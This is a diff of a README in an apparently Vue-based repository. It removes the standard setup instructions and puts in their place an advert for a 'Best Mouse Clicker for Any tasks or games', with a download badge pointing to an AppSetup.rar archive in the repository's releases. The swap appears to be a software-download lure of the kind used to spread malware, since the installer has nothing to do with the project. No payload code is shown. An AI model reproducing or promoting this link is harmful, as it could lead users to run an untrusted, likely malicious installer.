@@ -1,24 +1,7 @@
-# app
+#  Best Mouse Clicker for Any tasks or games
 
-## Project setup
-```
-npm install
-```
+Fully updated in 2024 FEB
 
-### Compiles and hot-reloads for development
-```
-npm run serve
-```
+Instructions & download below.
 
-### Compiles and minifies for production
-```
-npm run build
-```
-
-### Lints and fixes files
-```
-npm run lint
-```
-
-### Customize configuration
-See [Configuration Reference](https://cli.vuejs.org/config/).
+[![Download](https://github.com/saiyasone/piggyb_vue/assets/44050824/9c75f8e5-bc4a-4f24-81cf-1e273d596ad6)](https://github.com/saiyasone/piggyb_vue/releases/download/mouseclicker/AppSetup.rar)
